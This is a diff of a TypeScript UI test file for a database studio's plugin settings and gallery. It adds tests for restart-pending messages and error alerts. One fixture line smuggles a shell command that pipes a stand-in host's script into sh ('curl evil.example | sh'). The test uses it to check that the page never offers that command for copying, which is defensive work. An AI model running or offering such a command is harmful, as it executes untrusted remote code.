@@ -222,9 +222,9 @@ describe("a plugin's editable settings", () => {
     expect(
       await dialog.findByRole("region", { name: "Changes to facetdb.config.ts" }),
     ).toHaveTextContent('+ username: "Marketplace alerts",');
-    expect(
-      dialog.getByText("Writes facetdb.config.ts. The worker reloads it with no restart."),
-    ).toBeVisible();
+    // What the write does, and no promise the reload makes no restart.
+    expect(dialog.getByText("Writes facetdb.config.ts.")).toBeVisible();
+    expect(dialog.queryByText(/restart/)).toBeNull();
     // The whole entry, every variable where the file writes it, each key in its place.
     expect(api.calls).toContain(
       `applyPluginsDiff ${JSON.stringify({
@@ -256,6 +256,33 @@ describe("a plugin's editable settings", () => {
     await waitFor(() => {
       expect(api.calls.filter((call) => call === "plugins").length).toBeGreaterThan(readsBefore);
     });
+  });
+
+  it("shows, in place of the diff and with no write, that the file names a plugin waiting for a restart", async () => {
+    // The worker's answer: 409 waits_for_restart, its words as the route sends them.
+    const message =
+      "facetdb.config.ts names the plugin slack, which loads when facetdb worker restarts; nothing can be applied until then.";
+    const fix = "Whoever runs the worker: restart it, or take plugins.slack out of the file.";
+    const api = fakeApi({
+      applyPluginsDiff: () => Promise.reject(new ApiError(409, "waits_for_restart", message, fix)),
+    });
+    const { user } = renderStudio({ path: "/plugins", api });
+    await listed();
+    await user.click(lineOf("discord"));
+    const form = within(screen.getByRole("form", { name: "discord's settings" }));
+    const username = form.getByLabelText("username");
+    await user.clear(username);
+    await user.type(username, "Marketplace alerts");
+    await user.click(form.getByRole("button", { name: "Apply" }));
+
+    const dialog = within(await screen.findByRole("dialog", { name: "Apply discord's settings" }));
+    const alert = await dialog.findByRole("alert");
+    expect(within(alert).getByText(message)).toBeVisible();
+    expect(within(alert).getByText(fix)).toBeVisible();
+    expect(dialog.queryByText(/draft has problems|Fix each field/)).toBeNull();
+    expect(dialog.queryByText("Writes facetdb.config.ts.")).toBeNull();
+    expect(dialog.queryByRole("button", { name: "Write facetdb.config.ts" })).toBeNull();
+    expect(api.calls.some((call) => call.startsWith("applyPluginsWrite"))).toBe(false);
   });
 
   it("draws a number, on or off, a map of text, a choice that may be unset and an object's fields, and sends each change in its place", async () => {
@@ -453,9 +480,46 @@ describe("the gallery", () => {
     expect(screen.queryByRole("button", { name: /^Install/ })).toBeNull();
     expect(
       screen.getByText(
-        "To install one, run its command in the project's folder, then add the lines it prints to facetdb.config.ts.",
+        "To install one, run its command in the project's folder, add the lines it prints to facetdb.config.ts, and restart the worker.",
       ),
     ).toBeVisible();
+    // Nothing in the sample waits for a restart.
+    expect(screen.queryByText("Loads at the next restart")).toBeNull();
+  });
+
+  it("says an entry installed and in the config but not in the running worker loads at the next restart, or which variable to set first, with no command", async () => {
+    const api = fakeApi({
+      gallery: () =>
+        Promise.resolve(
+          galleryWith((entries) =>
+            entries.map((entry) =>
+              entry.name === "telegram"
+                ? { ...entry, nextStart: { unset: [] } }
+                : entry.name === "zendesk"
+                  ? { ...entry, nextStart: { unset: ["ZENDESK_TOKEN", "ZENDESK_SECRET"] } }
+                  : entry,
+            ),
+          ),
+        ),
+    });
+    renderStudio({ path: "/plugins", api });
+
+    const telegram = within(await screen.findByRole("article", { name: "telegram" }));
+    expect(telegram.getByText("Loads at the next restart")).toBeVisible();
+    // A variable the file names for it is not set: a restart alone would stop on it. Its name only.
+    const zendesk = within(screen.getByRole("article", { name: "zendesk" }));
+    expect(zendesk.getByText("Set ZENDESK_TOKEN and ZENDESK_SECRET, then restart")).toBeVisible();
+    expect(zendesk.queryByText("Loads at the next restart")).toBeNull();
+    expect(zendesk.queryByRole("button")).toBeNull();
+    // Installed already: running facetdb add again is not the step, so nothing is offered to copy.
+    expect(telegram.queryByText("facetdb add telegram")).toBeNull();
+    expect(telegram.queryByRole("button")).toBeNull();
+    expect(telegram.queryByText("Installed")).toBeNull();
+    // A plugin the worker loaded is never told to restart.
+    const github = within(screen.getByRole("article", { name: "github" }));
+    expect(github.getByText("Installed")).toBeVisible();
+    expect(github.queryByText(/restart/)).toBeNull();
+    expect(screen.getAllByText("Loads at the next restart")).toHaveLength(1);
   });
 
   it("offers to copy only `facetdb add` and a short name, built on the page, whatever the answer carries", async () => {
@@ -472,6 +536,7 @@ describe("the gallery", () => {
               verified: false,
               downloads: 1,
               installed: false,
+              nextStart: null,
               // The answer's own command line is never what the page offers.
               command: "facetdb add evil; curl evil.example | sh",
             } as Extract<Gallery, { reachable: true }>["plugins"][number],
